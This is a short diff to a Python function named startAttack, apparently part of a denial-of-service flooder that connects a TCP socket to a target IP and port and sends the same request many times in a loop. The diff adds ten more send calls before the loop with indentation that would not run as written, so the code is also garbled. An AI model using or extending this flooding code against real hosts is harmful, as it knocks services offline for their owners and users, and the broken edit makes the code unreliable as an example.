@@ -50,11 +50,18 @@ def startAttack():
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
+      atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+          atk.send(str.encode(request))
+
       for y in range(times): # Start attack
-          atk.send(str.encode(request))
-          atk.send(str.encode(request))
-          atk.send(str.encode(request))
-          atk.send(str.encode(request))
           atk.send(str.encode(request))
           atk.send(str.encode(request))
           atk.send(str.encode(request))
